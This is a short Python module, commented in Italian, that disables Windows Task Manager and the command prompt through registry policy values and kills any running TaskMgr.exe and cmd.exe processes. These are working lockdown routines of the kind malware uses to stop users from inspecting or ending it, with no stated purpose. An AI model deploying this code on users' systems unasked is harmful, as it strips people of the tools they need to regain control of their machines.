import winreg as wr
import win32pdhutil
import win32api
import win32con


#Disabilita il Task Manager
def disableTaskMgr(HKCU, TASKMGR_REG):
    
    #Creazione e attivazione del Valore Disabilitatore
    key = wr.CreateKey(HKCU, TASKMGR_REG)
    wr.SetValueEx(key, "DisableTaskMgr", 0, wr.REG_DWORD, 0x00000001)
    key.Close()
   
   
   
#Disabilita il CMD
def disableCMD(HKCU, CMD_REG):
    
    #Creazione e attivazione del Valore Disabilitatore
    key = wr.CreateKey(HKCU, CMD_REG)
    wr.SetValueEx(key, "DisableCMD", 0, wr.REG_DWORD, 0x00000001)
    key.Close()



#Chiude eventuali processi attivi
def closeTaskMgr():
    pid_TaskMgr = win32pdhutil.FindPerformanceAttributesByName('TaskMgr')   #ricava il pid del processo TaskMgr.exe
    handle_TaskMgr = win32api.OpenProcess(win32con.PROCESS_TERMINATE, 0,pid_TaskMgr[0])
    win32api.TerminateProcess(handle_TaskMgr,0) #termina TaskMgr.exe



#Chiude eventuali processi attivi
def closeCMD():
    pid_CMD = win32pdhutil.FindPerformanceAttributesByName('cmd') #ricava il pid del processo cmd.exe
    handle_CMD = win32api.OpenProcess(win32con.PROCESS_TERMINATE, 0,pid_CMD[0])
    win32api.TerminateProcess(handle_CMD,0) #termina cmd.exe




